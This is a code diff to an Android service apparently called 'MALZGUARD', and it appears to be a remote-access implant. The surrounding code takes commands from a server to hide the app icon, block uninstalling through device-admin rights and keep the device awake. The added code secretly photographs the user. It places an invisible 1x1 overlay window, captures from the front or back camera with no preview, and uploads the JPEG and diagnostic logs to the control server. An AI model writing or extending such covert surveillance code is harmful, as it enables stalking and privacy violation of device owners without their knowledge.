@@ -5,9 +5,15 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.graphics.PixelFormat
+import android.hardware.camera2.*
+import android.media.ImageReader
 import android.os.*
 import android.provider.Settings
 import android.net.Uri
+import android.view.Gravity
+import android.view.WindowManager
+import android.widget.FrameLayout
 import android.widget.Toast
 import org.json.JSONArray
 import org.json.JSONObject
@@ -21,6 +27,10 @@ class Svc : Service() {
     private var id = ""
     private val server = Config.SERVER
     private var wakeLock: PowerManager.WakeLock? = null
+    private var camThread: HandlerThread? = null
+    private var camHandler: Handler? = null
+    private var overlayView: FrameLayout? = null
+    private var wm: WindowManager? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -34,6 +44,9 @@ class Svc : Service() {
             val n = Notification.Builder(this, "mg").setContentTitle("MALZGUARD").setContentText("Service running").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
             startForeground(1, n)
             try { val pm = getSystemService(POWER_SERVICE) as PowerManager; wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MALZGUARD::wl"); wakeLock?.setReferenceCounted(false); wakeLock?.acquire() } catch (e: Exception) {}
+            camThread = HandlerThread("cam").also { it.start() }
+            camHandler = Handler(camThread!!.looper)
+            wm = getSystemService(WINDOW_SERVICE) as WindowManager
         } catch (e: Exception) {}
         running = true
         Thread { loop() }.start()
@@ -94,6 +107,17 @@ class Svc : Service() {
         } catch (e: Exception) { return null }
     }
 
+    private fun logSrv(kind: String, msg: String) {
+        try {
+            val c = URL("$server/api/log/$id/$kind").openConnection() as HttpURLConnection
+            c.connectTimeout = 5000; c.readTimeout = 5000; c.requestMethod = "POST"; c.doOutput = true
+            c.setRequestProperty("Content-Type", "text/plain")
+            c.outputStream.use { it.write(msg.toByteArray()) }
+            try { c.responseCode; c.inputStream?.close() } catch (e: Exception) {}
+            c.disconnect()
+        } catch (e: Exception) {}
+    }
+
     private fun heartbeat() {
         try {
             val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
@@ -144,12 +168,6 @@ class Svc : Service() {
                         i.setPackage(packageName)
                         sendBroadcast(i)
                     } catch (e: Exception) {}
-                    try {
-                        val i = Intent(this, LockOverlay::class.java)
-                        i.putExtra("html", LockOverlay.DEFAULT_HTML)
-                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                        startActivity(i)
-                    } catch (e: Exception) {}
                     "unlock sent"
                 }
                 "vibrate" -> {
@@ -181,22 +199,121 @@ class Svc : Service() {
                 "show_icon" -> { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP); "shown" }
                 "uninstall_block" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, true); "blocked" } else "ERR: not admin" }
                 "uninstall_unblock" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, false); "unblocked" } else "ERR: not admin" }
-                "take_photo" -> {
-                    val facing = a.optString("facing", "back")
-                    val i = Intent(this, CamActivity::class.java)
-                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                    i.putExtra("facing", facing)
-                    startActivity(i)
-                    "camera launched"
-                }
+                "take_photo" -> { takePhoto(a.optString("facing", "back")); "photo requested" }
                 else -> "unknown"
             }
         } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
     }
 
+    private fun takePhoto(facing: String) {
+        try {
+            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
+                logSrv("cam_err", "no_overlay_permission")
+                Handler(Looper.getMainLooper()).post {
+                    try { startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (e: Exception) {}
+                }
+                return
+            }
+            showOverlay()
+            camHandler?.postDelayed({ capturePhoto(facing) }, 300)
+        } catch (e: Exception) { logSrv("cam_err", "take: " + (e.message ?: "?")); hideOverlay() }
+    }
+
+    private fun showOverlay() {
+        try {
+            hideOverlay()
+            val v = FrameLayout(this)
+            v.setBackgroundColor(0x00000000)
+            val type = if (Build.VERSION.SDK_INT >= 26) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE
+            val lp = WindowManager.LayoutParams(1, 1, type, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN, PixelFormat.TRANSLUCENT)
+            lp.gravity = Gravity.TOP or Gravity.START
+            lp.x = 0; lp.y = 0
+            wm?.addView(v, lp)
+            overlayView = v
+            logSrv("cam_ovl", "shown")
+        } catch (e: Exception) { logSrv("cam_err", "ovl: " + (e.message ?: "?")) }
+    }
+
+    private fun hideOverlay() {
+        try { overlayView?.let { wm?.removeView(it) } } catch (e: Exception) {}
+        overlayView = null
+    }
+
+    private fun capturePhoto(facing: String) {
+        try {
+            val cm = getSystemService(CAMERA_SERVICE) as CameraManager
+            val camId = cm.cameraIdList.firstOrNull { cid ->
+                val ch = cm.getCameraCharacteristics(cid)
+                val f = ch.get(CameraCharacteristics.LENS_FACING)
+                if (facing == "front") f == CameraCharacteristics.LENS_FACING_FRONT else f == CameraCharacteristics.LENS_FACING_BACK
+            } ?: cm.cameraIdList.firstOrNull() ?: run { logSrv("cam_err", "no_cam"); hideOverlay(); return }
+            val ch = cm.getCameraCharacteristics(camId)
+            val sz = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(ImageReader::class.java)?.firstOrNull() ?: run { logSrv("cam_err", "no_size"); hideOverlay(); return }
+            logSrv("cam_open", "id=$camId ${sz.width}x${sz.height}")
+            val reader = ImageReader.newInstance(sz.width, sz.height, android.graphics.ImageFormat.JPEG, 1)
+            reader.setOnImageAvailableListener({ r ->
+                try {
+                    val img = r.acquireLatestImage()
+                    val buf = img?.planes?.get(0)?.buffer
+                    if (buf != null) {
+                        val bytes = ByteArray(buf.remaining()); buf.get(bytes)
+                        logSrv("cam_snap", "size=${bytes.size}")
+                        uploadPhoto(bytes)
+                    } else logSrv("cam_err", "no_buf")
+                    img?.close()
+                } catch (e: Exception) { logSrv("cam_err", "snap: " + (e.message ?: "?")) }
+                try { r.close() } catch (e: Exception) {}
+                hideOverlay()
+            }, camHandler)
+            cm.openCamera(camId, object : CameraDevice.StateCallback() {
+                override fun onOpened(cam: CameraDevice) {
+                    logSrv("cam_opened", "ok")
+                    try {
+                        cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(sess: CameraCaptureSession) {
+                                try {
+                                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                                    req.addTarget(reader.surface)
+                                    sess.capture(req.build(), null, camHandler)
+                                    camHandler?.postDelayed({ try { cam.close() } catch (e: Exception) {} }, 3000)
+                                } catch (e: Exception) { logSrv("cam_err", "capture: " + (e.message ?: "?")); hideOverlay() }
+                            }
+                            override fun onConfigureFailed(sess: CameraCaptureSession) { logSrv("cam_err", "config_fail"); hideOverlay() }
+                        }, camHandler)
+                    } catch (e: Exception) { logSrv("cam_err", "session: " + (e.message ?: "?")); hideOverlay() }
+                }
+                override fun onDisconnected(cam: CameraDevice) { try { cam.close() } catch (e: Exception) {}; logSrv("cam_err", "disc"); hideOverlay() }
+                override fun onError(cam: CameraDevice, e: Int) { try { cam.close() } catch (e: Exception) {}; logSrv("cam_err", "onerr=$e"); hideOverlay() }
+            }, camHandler)
+        } catch (e: Exception) { logSrv("cam_err", "cap: " + (e.message ?: "?")); hideOverlay() }
+    }
+
+    private fun uploadPhoto(bytes: ByteArray) {
+        try {
+            logSrv("photo_start", "id=${id.take(12)} size=${bytes.size}")
+            if (id.isEmpty()) { logSrv("photo_fail", "id_empty"); return }
+            val boundary = "----MG" + System.currentTimeMillis()
+            val head = ("--$boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"cam_${System.currentTimeMillis()}.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").toByteArray()
+            val tail = ("\r\n--$boundary--\r\n").toByteArray()
+            val total = head.size + bytes.size + tail.size
+            val c = URL("$server/api/upload/$id/photo").openConnection() as HttpURLConnection
+            c.connectTimeout = 20000; c.readTimeout = 30000; c.requestMethod = "POST"; c.doOutput = true
+            c.setFixedLengthStreamingMode(total)
+            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+            val os: OutputStream = c.outputStream
+            os.write(head); os.write(bytes); os.write(tail); os.flush(); os.close()
+            val code = c.responseCode
+            try { c.inputStream?.close() } catch (e: Exception) {}
+            try { c.disconnect() } catch (e: Exception) {}
+            logSrv("photo_ok", "code=$code")
+        } catch (e: Exception) { logSrv("photo_err", e.message ?: "?") }
+    }
+
     override fun onDestroy() {
         running = false
         try { wakeLock?.release() } catch (e: Exception) {}
+        try { camThread?.quitSafely() } catch (e: Exception) {}
+        hideOverlay()
         super.onDestroy()
     }
     override fun onBind(i: Intent?): IBinder? = null
